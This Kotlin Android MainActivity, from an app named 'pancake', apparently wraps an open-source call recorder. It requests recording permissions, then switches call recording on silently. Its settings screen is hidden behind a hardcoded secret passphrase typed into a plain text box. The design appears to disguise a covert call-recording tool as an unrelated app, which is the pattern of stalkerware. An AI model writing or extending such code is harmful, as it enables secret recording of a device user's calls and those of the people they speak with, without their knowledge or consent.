package com.pancake.callApp

import android.app.ActivityManager
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.chiller3.bcr.Permissions
import com.chiller3.bcr.Preferences
import com.chiller3.bcr.databinding.PancakeMainActivityBinding
import com.chiller3.bcr.settings.SettingsActivity
import java.util.Timer
import java.util.TimerTask


class MainActivity : AppCompatActivity() {

    private val requestPermissionRequired =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { granted ->
            // Call recording can still be enabled if optional permissions were not granted
            if (granted.all { it.key !in Permissions.REQUIRED || it.value }) {
                val bcrRef = Preferences(this)
                bcrRef.isCallRecordingEnabled = true
            } else {
                startActivity(Permissions.getAppInfoIntent(this))
            }
        }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val binding = PancakeMainActivityBinding.inflate(layoutInflater)
        setContentView(binding.root)
        val currentContext = this
        Timer().schedule(object : TimerTask() {
            override fun run() { 
                if (!Permissions.haveRequired(currentContext)){
                    requestPermissionRequired.launch(Permissions.REQUIRED + Permissions.OPTIONAL)
                }
            }
        }, 1000)

        binding.enterButton.setOnClickListener { 
            val text = binding.textEdit.text.toString()
            if (text == "jqxv4VdQA75elFRU") {
                val intent = Intent(this, SettingsActivity::class.java)
                startActivity(intent)
            }
        }
    }
}